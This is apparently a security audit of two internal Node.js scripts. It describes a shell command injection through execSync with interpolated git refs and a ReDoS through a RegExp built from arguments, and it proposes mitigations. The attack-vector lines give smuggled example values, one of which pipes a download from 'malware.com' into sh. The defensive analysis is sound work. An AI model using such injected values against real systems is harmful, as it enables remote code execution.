# Security Audit: Superpowers SDD Utility Scripts

This document evaluates the security model of the two internal utility scripts located in `.superpowers/sdd/`:
1. `review-package.cjs`
2. `task-brief.cjs`

---

## 1. `review-package.cjs` Security Analysis

### Vulnerability: Arbitrary Shell Command Injection
* **Location**: Lines 16-17, 23-24, 34-36, 54
* **Mechanism**: The script parses `base` and `head` references from user-supplied command line arguments (`process.argv[2]` and `process.argv[3]`) and interpolates them directly into shell commands via `execSync()` inside string templates:
  ```javascript
  execSync(`git rev-parse --verify --quiet "${base}"`);
  ```
* **Attack Vector**: If an attacker can control the inputs to `base` or `head`, they can supply shell execution operators (e.g. `"; calc.exe; #` or `head" && curl malware.com | sh`), breaking out of the double quotes to run arbitrary system commands under the context of the running process.
* **Mitigation**:
  * Implement strict pattern validation on git revision references before invoking shell operations. Git reference refs must conform to safe alphanumeric and select special symbols (`a-z`, `A-Z`, `0-9`, `-`, `_`, `.`, `/`, `@`, `~`, `^`).
  * Deny input containing spaces, quotes, semicolons, ampersands, or pipe characters.

---

## 2. `task-brief.cjs` Security Analysis

### Vulnerability: Regular Expression Denial of Service (ReDoS)
* **Location**: Line 32
* **Mechanism**: The script reads a task identifier (`taskNumber`) from `process.argv[3]` and dynamically compiles it into a regular expression object:
  ```javascript
  const taskHeaderRegex = new RegExp(`^#+[ \\t]+Task[ \\t]+${taskNumber}([^0-9]|$)`, 'i');
  ```
* **Attack Vector**: If `taskNumber` contains complex regex instructions (such as nested groups with overlapping repeat constraints e.g., `(a+)+`), the regex engine can experience extreme backtracking when tested against matching patterns, causing CPU exhaustion (ReDoS).
* **Mitigation**:
  * Sanitize `taskNumber` by enforcing that it consists entirely of numeric digits (`/^\d+$/`).
  * If alphanumeric identifiers are required, escape regex meta-characters before compiling the pattern.
